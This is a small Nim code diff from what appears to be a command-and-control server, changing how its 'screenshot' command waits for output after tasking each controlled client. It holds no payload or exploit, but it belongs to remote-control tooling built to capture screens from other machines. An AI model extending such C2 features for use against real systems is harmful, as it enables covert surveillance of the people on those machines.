@@ -9,7 +9,8 @@ import ../../types, ../../communication
 proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
   for client in server.cli.handlingClient:
     let task = await client.sendClientTask("screenshot")
-    if not task.isNil(): await task.awaitResponse()
+    if not task.isNil(): 
+      server.cli.waitingForOutput = true
 
 let cmd*: Command = Command(
   execProc: execProc,
